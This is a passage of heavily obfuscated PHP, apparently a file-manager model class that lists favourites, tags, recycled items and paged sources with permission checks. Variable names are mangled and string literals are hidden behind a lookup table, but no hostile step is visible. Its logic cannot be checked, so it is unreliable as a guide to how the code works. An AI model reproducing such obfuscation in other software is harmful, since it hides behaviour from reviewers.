($ëØíÚ‚[$Ş‰²×öü[487]] != 1) { $ëØíÚ‚[$Ş‰²×öü[169]] = $ëØíÚ‚[$Ş‰²×öü[488]]; unset($ëØíÚ‚[$Ş‰²×öü[488]]); } $øÔË–Ü¶ = $®ñĞÀ–; if (isset($ëØíÚ‚[$Ş‰²×öü[489]]) && $ëØíÚ‚[$Ş‰²×öü[489]][$Ş‰²×öü[490]] == -1) { $øÔË–Ü¶ = $Ø¬Ü‹—; } $ëØíÚ‚ = array_field_key($ëØíÚ‚, $øÔË–Ü¶); return $ëØíÚ‚; } public function listUserFav() { $¯µ´Í =& $_SERVER[™¸œØ®Ü]; $¿Øï•ºÊ = Model($¯µ´Í[491])->listData(); $ˆÂõ•‡ = array_filter_by_field($¿Øï•ºÊ, $¯µ´Í[33], $¯µ´Í[492]); $ˆÂõ•‡ = array_to_keyvalue($ˆÂõ•‡, $¯µ´Í[12], $¯µ´Í[87]); if ($ˆÂõ•‡) { $õñ•ª·© = $this->listSource(array($¯µ´Í[493] => array($¯µ´Í[494], $ˆÂõ•‡))); } $õñ•ª·© = array_to_keyvalue($õñ•ª·©[$¯µ´Í[447]], $¯µ´Í[193]); foreach ($¿Øï•ºÊ as &$ƒ£œÈùÁ) { $ƒ£œÈùÁ = array($¯µ´Í[495] => $ƒ£œÈùÁ[$¯µ´Í[477]], $¯µ´Í[496] => $ƒ£œÈùÁ[$¯µ´Í[32]], $¯µ´Í[497] => $ƒ£œÈùÁ[$¯µ´Í[87]], $¯µ´Í[498] => $ƒ£œÈùÁ[$¯µ´Í[33]], $¯µ´Í[499] => $ƒ£œÈùÁ[$¯µ´Í[233]], $¯µ´Í[500] => $ƒ£œÈùÁ[$¯µ´Í[88]]); if ($ƒ£œÈùÁ[$¯µ´Í[33]] == $¯µ´Í[492] && $õñ•ª·©[$ƒ£œÈùÁ[$¯µ´Í[87]]]) { $ƒ£œÈùÁ[$¯µ´Í[90]] = $õñ•ª·©[$ƒ£œÈùÁ[$¯µ´Í[87]]]; } } unset($ƒ£œÈùÁ); return $¿Øï•ºÊ; } public function listUserTag($õ£’§Ê) { $èÛ¿êÁñ =& $_SERVER[™¸œØ®Ü]; if ($õ£’§Ê && !is_array($õ£’§Ê)) { $õ£’§Ê = array($õ£’§Ê); } $ôš£Ì† = Model($èÛ¿êÁñ[501])->listData(); $¤ã÷óéì = array(); $€äß™¸ = array(); foreach ($ôš£Ì† as $·Ä¦Ù™º) { $½œ´‰­ = $·Ä¦Ù™º[$èÛ¿êÁñ[87]]; if (!$½œ´‰­) { continue; } if (!isset($€äß™¸[$½œ´‰­])) { $€äß™¸[$½œ´‰­] = array(); } $€äß™¸[$½œ´‰­][] = $·Ä¦Ù™º[$èÛ¿êÁñ[502]]; $¤ã÷óéì[$·Ä¦Ù™º[$èÛ¿êÁñ[87]]] = $·Ä¦Ù™º; } $úî³›ªì = array(); $÷Ö˜ÏÇ = array(); $ËÍˆÕœ¶ = array(); foreach ($€äß™¸ as $µŞ¥À²Ş => $ÏÕ¾ûó…) { $ªÖÜ–â = !0; if (!$õ£’§Ê) { $úî³›ªì[] = $µŞ¥À²Ş; continue; } foreach ($õ£’§Ê as $Õõ“‹ªñ) { if (!in_array($Õõ“‹ªñ, $ÏÕ¾ûó…)) { $ªÖÜ–â = !1; break; } } if (!$ªÖÜ–â) { continue; } if (!is_numeric($µŞ¥À²Ş)) { $û¯­çëå = $¤ã÷óéì[$µŞ¥À²Ş]; $ÊàŠˆÎ = array($èÛ¿êÁñ[32] => $û¯­çëå[$èÛ¿êÁñ[32]], $èÛ¿êÁñ[87] => $û¯­çëå[$èÛ¿êÁñ[87]], $èÛ¿êÁñ[33] => $û¯­çëå[$èÛ¿êÁñ[33]], $èÛ¿êÁñ[90] => array($èÛ¿êÁñ[503] => 1), $èÛ¿êÁñ[234] => !0); if ($û¯­çëå[$èÛ¿êÁñ[33]] == $èÛ¿êÁñ[232]) { $ËÍˆÕœ¶[] = $ÊàŠˆÎ; } if ($û¯­çëå[$èÛ¿êÁñ[33]] == $èÛ¿êÁñ[78]) { $÷Ö˜ÏÇ[] = $ÊàŠˆÎ; } continue; } $úî³›ªì[] = $µŞ¥À²Ş; } if ($úî³›ªì) { $áŠµé¬â = $this->listSource(array($èÛ¿êÁñ[493] => array($èÛ¿êÁñ[494], $úî³›ªì))); } $áŠµé¬â = $áŠµé¬â ? $áŠµé¬â : array($èÛ¿êÁñ[85] => array(), $èÛ¿êÁñ[86] => array()); $áŠµé¬â[$èÛ¿êÁñ[85]] = array_merge($áŠµé¬â[$èÛ¿êÁñ[85]], $÷Ö˜ÏÇ); $áŠµé¬â[$èÛ¿êÁñ[86]] = array_merge($áŠµé¬â[$èÛ¿êÁñ[86]], $ËÍˆÕœ¶); if (isset($áŠµé¬â[$èÛ¿êÁñ[444]]) && count($úî³›ªì) == $áŠµé¬â[$èÛ¿êÁñ[444]][$èÛ¿êÁñ[445]]) { return $áŠµé¬â; } $İŒåÆÎ² = array(); $Ú’Æ¨¯ = array_to_keyvalue($áŠµé¬â[$èÛ¿êÁñ[85]], $èÛ¿êÁñ[12], $èÛ¿êÁñ[193]); $äÊçØÅ¹ = array_to_keyvalue($áŠµé¬â[$èÛ¿êÁñ[86]], $èÛ¿êÁñ[12], $èÛ¿êÁñ[193]); $óÏŠ® = array_merge($äÊçØÅ¹, $Ú’Æ¨¯); foreach ($úî³›ªì as $½œ´‰­) { if (!in_array($½œ´‰­, $óÏŠ®)) { $İŒåÆÎ²[] = $½œ´‰­; } } if ($İŒåÆÎ²) { Model($èÛ¿êÁñ[504])->removeBySource($İŒåÆÎ²); } return $áŠµé¬â; } public function listUserRecycle() { $¨Ü±ş‹õ =& $_SERVER[™¸œØ®Ü]; $­ÃöÎè = Model($¨Ü±ş‹õ[505])->listData(); if (!$­ÃöÎè) { return array(); } $Úºğç¹´ = array($¨Ü±ş‹õ[493] => array($¨Ü±ş‹õ[494], $­ÃöÎè), $¨Ü±ş‹õ[506] => 1); return $this->listSource($Úºğç¹´); } public function listSource($İÄ„«ô, $ûÈÔ³ü = 3000, $Éò·Şºæ = false) { $¶Ôå»¸Ï =& $_SERVER[™¸œØ®Ü]; if (!isset($İÄ„«ô[$¶Ôå»¸Ï[507]])) { $İÄ„«ô[$¶Ôå»¸Ï[507]] = 0; } if (isset($İÄ„«ô[$¶Ôå»¸Ï[192]]) && $İÄ„«ô[$¶Ôå»¸Ï[192]] == $¶Ôå»¸Ï[230]) { $İÄ„«ô[$¶Ôå»¸Ï[488]] = array($¶Ôå»¸Ï[508], $¶Ôå»¸Ï[12]); } $‹†Ú—Ì— = $¶Ôå»¸Ï[509]; $òí¬Ú = $this->field($‹†Ú—Ì—)->_makeOrder()->where($İÄ„«ô)->selectPage($ûÈÔ³ü); $this->_listPageCheck($òí¬Ú, $‹†Ú—Ì—, $İÄ„«ô); $this->_listDataApply($òí¬Ú[$¶Ôå»¸Ï[447]], $Éò·Şºæ); $this->_listMake($òí¬Ú); return $òí¬Ú; } private function _listPageCheck(&$Éá¡ÜÔì, $ñ©½¸àÜ, $Ø’â¦Šò) { $×•ï‡û© =& $_SERVER[™¸œØ®Ü]; if (!is_array($Éá¡ÜÔì[$×•ï‡û©[444]])) { return; } $¸Ã–Ãí” = $Éá¡ÜÔì[$×•ï‡û©[444]]; if ($¸Ã–Ãí”[$×•ï‡û©[446]] <= 1) { return; } if ($¸Ã–Ãí”[$×•ï‡û©[445]] >= 100000) { return; } if (Model($×•ï‡û©[510])->get($×•ï‡û©[511]) != $×•ï‡û©[512]) { return; } $ñ©½¸àÜ = str_replace(array($×•ï‡û©[53], $×•ï‡û©[419], $×•ï‡û©[287]), $×•ï‡û©[12], $ñ©½¸àÜ); $ñ©½¸àÜ = $×•ï‡û©[513] . str_replace($×•ï‡û©[50], $×•ï‡û©[514], $ñ©½¸àÜ) . $×•ï‡û©[515]; $¹šÈıºï = $×•ï‡û©[516]; $¹šÈıºï = $¹šÈıºï . $×•ï‡û©[517]; $¯Ø»¸¶¢ = $¸Ã–Ãí”[$×•ï‡û©[441]] * ($¸Ã–Ãí”[$×•ï‡û©[430]] - 1) . $×•ï‡û©[50] . $¸Ã–Ãí”[$×•ï‡û©[441]]; $ÀË€”Îı = $this->_makeOrder(!0); $Ú­êê‰ö = $×•ï‡û©[513] . str_replace($×•ï‡û©[50], $×•ï‡û©[514], $ÀË€”Îı[0]); if (strpos($Ú­êê‰ö, $×•ï‡û©[518])) { $Ú­êê‰ö = str_replace($×•ï‡û©[518], $×•ï‡û©[519], $Ú­êê‰ö); } else { $Ú­êê‰ö .= $×•ï‡û©[520] . $ÀË€”Îı[1]; } $âÅ»©á· = array(); foreach ($Ø’â¦Šò as $²¾’˜Ñü => $Îóç“) { $âÅ»©á·[$×•ï‡û©[513] . $²¾’˜Ñü] = $Îóç“; } $this->alias($×•ï‡û©[521])->field($ñ©½¸àÜ)->limit($¯Ø»¸¶¢)->order($Ú­êê‰ö); $Êø½ÑÚã = $this->join($¹šÈıºï)->where($âÅ»©á·)->select(); if ($Êø½ÑÚã) { $Éá¡ÜÔì[$×•ï‡û©[447]] = $Êø½ÑÚã; } } protected function _makeOrder($ˆéÊö¹ï = false) { $ˆÎñ±ã“ =& $_SERVER[™¸œØ®Ü]; $å¡ş”ÔÎ = Model($ˆÎñ±ã“[522])->get($ˆÎñ±ã“[523]); $¿µĞö«Ò = Model($ˆÎñ±ã“[522])->get($ˆÎñ±ã“[524]); $ÁÂÜ³ = array($ˆÎñ±ã“[525] => $ˆÎñ±ã“[526], $ˆÎñ±ã“[527] => $ˆÎñ±ã“[528]); $¿·Ûşîº = array($ˆÎñ±ã“[32] => $ˆÎñ±ã“[32], $ˆÎñ±ã“[79] => $ˆÎñ±ã“[79], $ˆÎñ±ã“[169] => $ˆÎñ±ã“[488], $ˆÎñ±ã“[529] => $ˆÎñ±ã“[529], $ˆÎñ±ã“[530] => $ˆÎñ±ã“[531], $ˆÎñ±ã“[233] => $ˆÎñ±ã“[233], $ˆÎñ±ã“[88] => $ˆÎñ±ã“[88]); $€®åš—ã = Input::get($ˆÎñ±ã“[532], $ˆÎñ±ã“[7], $å¡ş”ÔÎ, array_keys($¿·Ûşîº)); $°ö©©™‹ = Input::get($ˆÎñ±ã“[533], $ˆÎñ±ã“[7], $¿µĞö«Ò, array_keys($ÁÂÜ³)); if (!in_array($€®åš—ã, array_keys($¿·Ûşîº))) { $€®åš—ã = $ˆÎñ±ã“[32]; } if (!in_array($°ö©©™‹, array_keys($ÁÂÜ³))) { $€®åš—ã = $ˆÎñ±ã“[525]; } if ($€®åš—ã == $ˆÎñ±ã“[32]) { } $öİê½ = $ˆÎñ±ã“[534] . $¿·Ûşîº[$€®åš—ã] . $ˆÎñ±ã“[53] . $ÁÂÜ³[$°ö©©™‹]; $öİê½ = rtrim(trim($öİê½), $ˆÎñ±ã“[50]); if ($ˆéÊö¹ï) { return array($öİê½, $ÁÂÜ³[$°ö©©™‹]); } return $this->order($öİê½); } protected function _listDataApplyItem($Ã—ˆÓ˜‰, $¸ÙÑãÇ¬ = false) { $æ¬‡íÑØ = array($Ã—ˆÓ˜‰); $this->_listDataApply($æ¬‡íÑØ, $¸ÙÑãÇ¬); return $æ¬‡íÑØ[0]; } protected function _listDataApply(&$†ŞÏÅôÌ, $±±ƒì…Ã = false) { $›†½íïñ =& $_SERVER[™¸œØ®Ü]; if (!$†ŞÏÅôÌ) { $†ŞÏÅôÌ = array(); return; } $úê¡“Ã‘ = array_to_keyvalue($†ŞÏÅôÌ, $›†½íïñ[12], $›†½íïñ[193]); $úê¡“Ã‘ = array_unique($úê¡“Ã‘); $this->_listSourceCache($†ŞÏÅôÌ); if (!$±±ƒì…Ã) { $this->_listAppendMeta($†ŞÏÅôÌ, $úê¡“Ã‘); $this->_listAppendFileMeta($†ŞÏÅôÌ, $úê¡“Ã‘); $this->_listAppendChildren($†ŞÏÅôÌ, $úê¡“Ã‘); } $this->_listAppendPath($†ŞÏÅôÌ); $this->_listAppendAuth($†ŞÏÅôÌ); $this->_listAppendSourceInfo($†ŞÏÅôÌ, $úê¡“Ã‘); $this->_listAppendUser($†ŞÏÅôÌ); $this->_listFilterInfo($†ŞÏÅôÌ, $±±ƒì…Ã); $this->_listAppendAuthSecret($†ŞÏÅôÌ); } protected function _listSourceCache($Ñøê•±Ì) { $‚åÕ­¶ı =& $_SERVER[™¸œØ®Ü]; foreach ($Ñøê•±Ì as $Ë‘™¯ĞØ) { self::$cacheSourceInfo[$‚åÕ­¶ı[535] . $Ë‘™¯ĞØ[$‚åÕ­¶ı[193]]] = $Ë‘™¯ĞØ; } } protected function _listFilterInfo(&$º«™–ı, $‹¦€œá¢ = false) { $¡…‡ï =& $_SERVER[™¸œØ®Ü]; foreach ($º«™–ı as &$—Ôœ¢…ş) { $—Ôœ¢…ş = $this->pathInfoFilter($—Ôœ¢…ş); self::$cachePathInfo[$¡…‡ï[536] . intval($‹¦€œá¢) . $¡…‡ï[464] . $—Ôœ¢…ş[$¡…‡ï[193]]] = $—Ôœ¢…ş; } unset($—Ôœ¢…ş); } protected function _listMake(&$·µ©×ç) { $ªÖÇšç¢ =& $_SERVER[™¸œØ®Ü]; $·µ©×ç[$ªÖÇšç¢[85]] = array(); $·µ©×ç[$ªÖÇšç¢[86]] = array(); foreach ($·µ©×ç[$ªÖÇšç¢[447]] as $Ê„»›©Ò) { $”­££ÀĞ = $Ê„»›©Ò[$ªÖÇšç¢[487]] == 1 ? $ªÖÇšç¢[85] : $ªÖÇšç¢[86]; $·µ©×ç[$”­££ÀĞ][] = $Ê„»›©Ò; } unset($·µ©×ç[$ªÖÇšç¢[447]]); } protected function _listAppendMeta(&$¶Ñâ…İ, $—ò›¶—ß) { $´¹§¸ø° =& $_SERVER[™¸œØ®Ü]; $·£•”ƒÓ = array($´¹§¸ø°[493] => array($´¹§¸ø°[494], $—ò›¶—ß)); $·’–Ê›‰ = Model($´¹§¸ø°[537])->field($´¹§¸ø°[538])->where($·£•”ƒÓ)->select(); if (!$·’–Ê›‰) { return; } $¨¹…š¤« = array($´¹§¸ø°[539], $´¹§¸ø°[540], $´¹§¸ø°[519]); $ÔµåÜ÷× = array(); foreach ($·’–Ê›‰ as $´±ĞÖ) { if (!isset($ÔµåÜ÷×[$´±ĞÖ[$´¹§¸ø°[193]]])) { $ÔµåÜ÷×[$´±ĞÖ[$´¹§¸ø°[193]]] = array(); } if (in_array($´±ĞÖ[$´¹§¸ø°[97]], $¨¹…š¤«)) { continue; } if ($´±ĞÖ[$´¹§¸ø°[97]] == $´¹§¸ø°[541]) { $´±ĞÖ[$´¹§¸ø°[452]] = $´¹§¸ø°[542]; } $ÔµåÜ÷×[$´±ĞÖ[$´¹§¸ø°[193]]][$´±ĞÖ[$´¹§¸ø°[97]]] = $´±ĞÖ[$´¹§¸ø°[452]]; } foreach ($¶Ñâ…İ as &$‘•€ˆŒ) { $‘•€ˆŒ[$´¹§¸ø°[543]] = !1; if (isset($ÔµåÜ÷×[$‘•€ˆŒ[$´¹§¸ø°[193]]])) { $‘•€ˆŒ[$´¹§¸ø°[543]] = $ÔµåÜ÷×[$‘•€ˆŒ[$´¹§¸ø°[193]]]; } if ($this->fileIsLock($‘•€ˆŒ) && $‘•€ˆŒ[$´¹§¸ø°[489]]) { $íë×ÖÔò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‘•€ˆŒ[$´¹§¸ø°[489]][$´¹§¸ø°[490]] = AuthModel::authDisable($‘•€ˆŒ[$´¹§¸ø°[489]][$´¹§¸ø°[490]], $íë×ÖÔò); $‘•€ˆŒ[$´¹§¸ø°[489]][$´¹§¸ø°[544]][$´¹§¸ø°[489]] = $‘•€ˆŒ[$´¹§¸ø°[489]][$´¹§¸ø°[490]]; } } unset($‘•€ˆŒ); } protected function _listAppendFileMeta(&$¹Ğìß, $ïôÙË¡Ş) { $Ê–‹§§— =& $_SERVER[™¸œØ®Ü]; $”ê üƒÆ = array_to_keyvalue($¹Ğìß, $Ê–‹§§—[12], $Ê–‹§§—[545]); $”ê üƒÆ = array_filter(array_unique($”ê üƒÆ)); if (!$”ê üƒÆ) { return; } $±ïäØıÇ = array($Ê–‹§§—[546] => array($Ê–‹§§—[494], $”ê üƒÆ)); $„ˆûæ¯Î = $Ê–‹§§—[547]; $µ˜ä˜™­ = Model($Ê–‹§§—[548])->field($„ˆûæ¯Î)->where($±ïäØıÇ)->select(); $µ˜ä˜™­ = array_to_keyvalue($µ˜ä˜™­, $Ê–‹§§—[545]); $³±³úöŸ = Model($Ê–‹§§—[549])->field($Ê–‹§§—[550])->where($±ïäØıÇ)->select(); $³±³úöŸ = $³±³úöŸ ? $³±³úöŸ : array(); $Òö·’áğ = array(); foreach ($³±³úöŸ as $ƒÜîÚ) { if (!isset($Òö·’áğ[$ƒÜîÚ[$Ê–‹§§—[545]]])) { $Òö·’áğ[$ƒÜîÚ[$Ê–‹§§—[545]]] = array(); } $Òö·’áğ[$ƒÜîÚ[$Ê–‹§§—[545]]][$ƒÜîÚ[$Ê–‹§§—[97]]] = $ƒÜîÚ[$Ê–‹§§—[452]]; } foreach ($¹Ğìß as &$ÄÛ‰¢—Î) { $”’âÜ‹ä = $ÄÛ‰¢—Î[$Ê–‹§§—[545]]; if (!$”’âÜ‹ä || !is_array($µ˜ä˜™­[$”’âÜ‹ä])) { continue; } $¶ï¡Ò½ü = $µ˜ä˜™­[$”’âÜ‹ä]; $¶ï¡Ò½ü[$Ê–‹§§—[79]] = $ÄÛ‰¢—Î[$Ê–‹§§—[79]]; $¶ï¡Ò½ü[$Ê–‹§§—[32]] = $ÄÛ‰¢—Î[$Ê–‹§§—[32]]; if (!$¶ï¡Ò½ü[$Ê–‹§§—[551]]) { Model($Ê–‹§§—[548])->fileMd5Check($¶ï¡Ò½ü); } if (!isset(self::$cacheFileInfo[$Ê–‹§§—[552] . $”’âÜ‹ä])) { self::$cacheFileInfo[$Ê–‹§§—[552] . $”’âÜ‹ä] = array_merge(array(), $¶ï¡Ò½ü); } unset($µ˜ä˜™­[$”’âÜ‹ä][$Ê–‹§§—[87]]); $÷ÚüÜÌù = isset($Òö·’áğ[$”’âÜ‹ä]) && is_array($Òö·’áğ[$”’âÜ‹ä]) ? $Òö·’áğ[$”’âÜ‹ä] : array(); $ÄÛ‰¢—Î[$Ê–‹§§—[170]] = array_merge($÷ÚüÜÌù, $µ˜ä˜™­[$”’âÜ‹ä]); if (isset($ÄÛ‰¢—Î[$Ê–‹§§—[170]][$Ê–‹§§—[184]])) { $ÄÛ‰¢—Î[$Ê–‹§§—[184]] = json_decode($ÄÛ‰¢—Î[$Ê–‹§§—[170]][$Ê–‹§§—[184]], !0); unset($ÄÛ‰¢—Î[$Ê–‹§§—[170]][$Ê–‹§§—[184]]); } } unset($ÄÛ‰¢—Î); } protected function _listAppendSourceInfo(&$Ç‰úÔ¢, $±…¤Ó¦ï) { $šòšôÛ” =& $_SERVER[™¸œØ®Ü]; $Ì‰Îğğ = Model($šòšôÛ”[553])->listData(); $­ÏØœÃ = Model($šòšôÛ”[501])->listData(); $—–Ã¨– = Model($šòšôÛ”[491])->listData(); $«òİñ½ä = Model($šòšôÛ”[554])->listSimple(); $ß¸ŞÔ = array_to_keyvalue($Ì‰Îğğ, $šòšôÛ”[477]); $±ùÉËÕ… = array_to_keyvalue_group($­ÏØœÃ, $šòšôÛ”[87], $šòšôÛ”[502]); $‹ôÈÓäú = array_to_keyvalue($—–Ã¨–, $šòšôÛ”[87]); $İÂÔÊÎ = array_to_keyvalue_group($«òİñ½ä, $šòšôÛ”[193]); foreach ($Ç‰úÔ¢ as &$ç÷›øş†) { $ç÷›øş†[$šòšôÛ”[90]] = array($šòšôÛ”[555] => 0, $šòšôÛ”[556] => 0, $šòšôÛ”[557] => 0); if (isset($‹ôÈÓäú[$ç÷›øş†[$šòšôÛ”[193]]])) { $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[558]] = 1; $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[559]] = $‹ôÈÓäú[$ç÷›øş†[$šòšôÛ”[193]]][$šòšôÛ”[32]]; } if ($±ùÉËÕ… && $ß¸ŞÔ && isset($±ùÉËÕ…[$ç÷›øş†[$šòšôÛ”[193]]])) { $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[560]] = array(); foreach ($±ùÉËÕ…[$ç÷›øş†[$šòšôÛ”[193]]] as $¼‹Öæó) { $ã‹Úøš‹ = $ß¸ŞÔ[$¼‹Öæó]; $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[560]][] = array($šòšôÛ”[561] => $ã‹Úøš‹[$šòšôÛ”[477]], $šòšôÛ”[496] => $ã‹Úøš‹[$šòšôÛ”[32]], $šòšôÛ”[562] => $ã‹Úøš‹[$šòšôÛ”[563]]); } } if ($İÂÔÊÎ && isset($İÂÔÊÎ[$ç÷›øş†[$šòšôÛ”[193]]])) { $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[564]] = array(); foreach ($İÂÔÊÎ[$ç÷›øş†[$šòšôÛ”[193]]] as $Ş… §Æ) { $Êò—Ÿ¼† = $šòšôÛ”[565]; if ($Ş… §Æ[$šòšôÛ”[566]] == $šòšôÛ”[91]) { $Êò—Ÿ¼† .= $šòšôÛ”[567]; } $ç÷›øş†[$šòšôÛ”[90]][$šòšôÛ”[564]] = array_field_key($Ş… §Æ, explode($šòšôÛ”[50], $Êò—Ÿ¼†)); } } } unset($ç÷›øş†); return $Ç‰úÔ¢; } protected function _listAppendChildren(&$Ò¢úîÕŒ, $ñûƒóõĞ) { $ƒ“³ÑşÀ =& $_SERVER[™¸œØ®Ü]; $›‚Ô†“ = array(); $‚À“ûÇ¶ = array($ƒ“³ÑşÀ[241] => 0, $ƒ“³ÑşÀ[242] => 0); foreach ($Ò¢úîÕŒ as &$ØÀˆÆÒ¥) { if (!$ØÀˆÆÒ¥[$ƒ“³ÑşÀ[487]]) { continue; } $›‚Ô†“[] = $ØÀˆÆÒ¥[$ƒ“³ÑşÀ[193]]; } unset($ØÀˆÆÒ¥); if (!$›‚Ô†“) { return; } $şÑÖğ½© = array($ƒ“³ÑşÀ[192] => array($ƒ“³ÑşÀ[7], $›‚Ô†“), $ƒ“³ÑşÀ[507] => 0); $Èòâ¶˜¥ = array($ƒ“³ÑşÀ[192], $ƒ“³ÑşÀ[487], $ƒ“³ÑşÀ[568] => $ƒ“³ÑşÀ[569]); $¹şÜ‹“³ = $this->field($Èòâ¶˜¥)->where($şÑÖğ½©)->group($ƒ“³ÑşÀ[570])->select(); $×­Êó»« = array(); foreach ($¹şÜ‹“³ as $™™–„ñ) { $ƒŞ¬ïÀÉ = $™™–„ñ[$ƒ“³ÑşÀ[192]]; $Ñ±Ä­©Ñ = $™™–„ñ[$ƒ“³ÑşÀ[487]] == $ƒ“³ÑşÀ[91] ? $ƒ“³ÑşÀ[242] : $ƒ“³ÑşÀ[241]; if (!isset($×­Êó»«[$ƒŞ¬ïÀÉ])) { $×­Êó»«[$ƒŞ¬ïÀÉ] = array($ƒ“³ÑşÀ[241] => 0, $ƒ“³ÑşÀ[242] => 0); } $×­Êó»«[$ƒŞ¬ïÀÉ][$Ñ±Ä­©Ñ] += $™™–„ñ[$ƒ“³ÑşÀ[569]]; } foreach ($Ò¢úîÕŒ as &$ØÀˆÆÒ¥) { if (!$ØÀˆÆÒ¥[$ƒ“³ÑşÀ[487]]) { continue; } $Õ•Øô®« = is_array($×­Êó»«[$ØÀˆÆÒ¥[$ƒ“³ÑşÀ[193]]]) ? $×­Êó»«[$ØÀˆÆÒ¥[$ƒ“³ÑşÀ[193]]] : $‚À“ûÇ¶; $ØÀˆÆÒ¥[$ƒ“³ÑşÀ[242]] = $Õ•Øô®«[$ƒ“³ÑşÀ[242]]; $ØÀˆÆÒ¥[$ƒ“³ÑşÀ[241]] = $Õ•Øô®«[$ƒ“³ÑşÀ[241]]; unset($ØÀˆÆÒ¥[$ƒ“³ÑşÀ[488]]); } unset($ØÀˆÆÒ¥); } protected function _listAppendAuth(&$í¼ï­ÀÙ) { $ØÂœû‰º =& $_SERVER[™¸œØ®Ü]; $òĞ‡¨Ë‡ = array(); foreach ($í¼ï­ÀÙ as $œóÅ”½„) { if ($œóÅ”½„[$ØÂœû‰º[190]] == self::TYPE_GROUP) { $òĞ‡¨Ë‡[] = $œóÅ”½„[$ØÂœû‰º[193]]; } } if (!$òĞ‡¨Ë‡) { return; } $‘íØá¥— = array_to_keyvalue($í¼ï­ÀÙ, $ØÂœû‰º[193]); $¹·Şˆ¨† = Model($ØÂœû‰º[571])->getSourceList($òĞ‡¨Ë‡, $‘íØá¥—); $×¢ˆë£ = KodUser::isRoot(); foreach ($í¼ï­ÀÙ as $…í„¹ªÏ => &$œóÅ”½„) { $œóÅ”½„[$ØÂœû‰º[489]] = $¹·Şˆ¨†[$œóÅ”½„[$ØÂœû‰º[193]]]; if (!$œóÅ”½„[$ØÂœû‰º[489]] && $œóÅ”½„[$ØÂœû‰º[190]] == self::TYPE_GROUP) { $œóÅ”½„[$ØÂœû‰º[489]] = Action($ØÂœû‰º[572])->pathGroupAuthMake($œóÅ”½„[$ØÂœû‰º[573]]); if (!$œóÅ”½„[$ØÂœû‰º[489]] && !$×¢ˆë£) { $œóÅ”½„[$ØÂœû‰º[235]] = !1; $œóÅ”½„[$ØÂœû‰º[234]] = !1; } } if ($œóÅ”½„[$ØÂœû‰º[489]]) { $œóÅ”½„[$ØÂœû‰º[235]] = AuthModel::authCheckEdit($œóÅ”½„[$ØÂœû‰º[489]][$ØÂœû‰º[490]]); $œóÅ”½„[$ØÂœû‰º[234]] = AuthModel::authCheckView($œóÅ”½„[$ØÂœû‰º[489]][$ØÂœû‰º[490]]); } $this->groupPathDisplay($œóÅ”½„); } unset($œóÅ”½„); } public function _listAppendAuthSecret(&$êıŸĞÚ…) { $©àé¨ÊÆ =& $_SERVER[™¸œØ®Ü]; if (Model($©àé¨ÊÆ[510])->get($©àé¨ÊÆ[574]) != $©àé¨ÊÆ[91]) { return; } static $Û´úÅ…° = false; if (!$Û´úÅ…°) { $„¶ê¦ÛÉ = Model($©àé¨ÊÆ[575]); $¸ïŞ³ÉÛ = Model($©àé¨ÊÆ[576]); $Û´úÅ…° = $¸ïŞ³ÉÛ->listData(); $Û´úÅ…° = array_to_keyvalue($Û´úÅ…°, $©àé¨ÊÆ[193]); $ï…ò¦À§ = json_decode(Model($©àé¨ÊÆ[510])->get($©àé¨ÊÆ[577]), !0); $ï…ò¦À§ = array_to_keyvalue($ï…ò¦À§, $©àé¨ÊÆ[477]); foreach ($Û´úÅ…° as $†«™àÛª => $ş¡™…æ) { $êÚë’¯ = $ï…ò¦À§[$ş¡™…æ[$©àé¨ÊÆ[578]]]; if (!$êÚë’¯) { $¸ïŞ³ÉÛ->remove($ş¡™…æ[$©àé¨ÊÆ[477]]); unset($Û´úÅ…°[$†«™àÛª]); continue; } $®Å‹Ú¨ö = $„¶ê¦ÛÉ->listData($êÚë’¯[$©àé¨ÊÆ[489]]); if (!$®Å‹Ú¨ö) { $¸ïŞ³ÉÛ->remove($ş¡™…æ[$©àé¨ÊÆ[477]]); unset($Û´úÅ…°[$†«™àÛª]); continue; } $ş¡™…æ[$©àé¨ÊÆ[489]] = $®Å‹Ú¨ö; $ş¡™…æ[$©àé¨ÊÆ[579]] = $êÚë’¯; $ş¡™…æ[$©àé¨ÊÆ[580]] = Model($©àé¨ÊÆ[581])->getInfoSimpleOuter($ş¡™…æ[$©àé¨ÊÆ[529]]); $Û´úÅ…°[$†«™àÛª] = $ş¡™…æ; } } $«õÒ¥úÂ = USER_ID; $©ó¯¯£† = array(); $¼³ä¦¼í = $this->_listAppendPath($©ó¯¯£†, !0); foreach ($êıŸĞÚ… as $†«™àÛª => &$ş¡™…æ) { if (!is_array($ş¡™…æ[$©àé¨ÊÆ[489]])) { continue; } if ($ş¡™…æ[$©àé¨ÊÆ[190]] != $©àé¨ÊÆ[582]) { continue; } if (isset($Û´úÅ…°[$ş¡™…æ[$©àé¨ÊÆ[193]]])) { $µÕ‡íÖì = $Û´úÅ…°[$ş¡™…æ[$©àé¨ÊÆ[193]]]; if (!is_array($ş¡™…æ[$©àé¨ÊÆ[543]])) { $ş¡™…æ[$©àé¨ÊÆ[543]] = array(); } $ş¡™…æ[$©àé¨ÊÆ[543]][$©àé¨ÊÆ[583]] = $µÕ‡íÖì[$©àé¨ÊÆ[578]]; $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[584]] = $µÕ‡íÖì; $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[585]] = $ş¡™…æ[$©àé¨ÊÆ[586]]; $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[587]] = $©àé¨ÊÆ[91]; if ($µÕ‡íÖì[$©àé¨ÊÆ[529]] != $«õÒ¥úÂ) { $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[490]] = $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[490]] & $µÕ‡íÖì[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[489]]; } continue; } $“û§Ö¼» = $this->parentLevelArray($ş¡™…æ[$©àé¨ÊÆ[588]]); $³÷ÈœåÏ = array_reverse($“û§Ö¼»); foreach ($³÷ÈœåÏ as $’ıÅ³©‰ => $€€âÆ¿) { if (!isset($Û´úÅ…°[$€€âÆ¿])) { continue; } $µÕ‡íÖì = $Û´úÅ…°[$€€âÆ¿]; $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[584]] = $µÕ‡íÖì; if 